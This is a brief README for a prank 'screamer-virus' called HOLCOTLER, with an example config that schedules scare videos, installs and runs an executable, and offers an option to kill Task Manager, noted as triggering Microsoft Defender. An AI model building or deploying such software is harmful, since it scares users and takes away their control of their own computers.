# HOLCOTLER
Created for fun screamer-virus

## CONFIG
Config file is `config.py`  
Example of config:
```python
#Activate times
#Examples 22:*:10; 12; *;
ACTIVATE = [
    ["20:14", False],
]

SCREAMERS_DIR = "screamers/"

#Enables taskmgr killer
#WARNING: MS Defender deletes the binary when toggled
KILL_TASKMGR = False


# INSTALL

#Directories to create
DIRS = [
    "screamers"
]

#Files to copy
FILES = [
    "main.exe",
    "screamers\\1.mp4"
]

#Files to run
RUN = [
    "main.exe"
]

```